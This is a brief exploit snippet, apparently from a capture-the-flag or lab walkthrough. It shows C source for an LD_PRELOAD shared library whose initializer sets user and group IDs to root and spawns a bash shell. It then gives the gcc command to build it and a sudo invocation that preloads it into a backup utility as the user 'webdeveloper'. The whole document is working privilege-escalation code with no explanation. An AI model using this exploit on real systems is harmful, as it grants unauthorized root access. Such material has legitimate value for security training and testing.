**preload.c**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 system("/bin/bash");
}
```



**Victim(webdeveloper)**

```
gcc -fPIC -shared -o preload.so preload.c -nostartfiles
sudo LD_PRELOAD=/home/webdeveloper/preload.so /usr/bin/sky_backup_utility
```
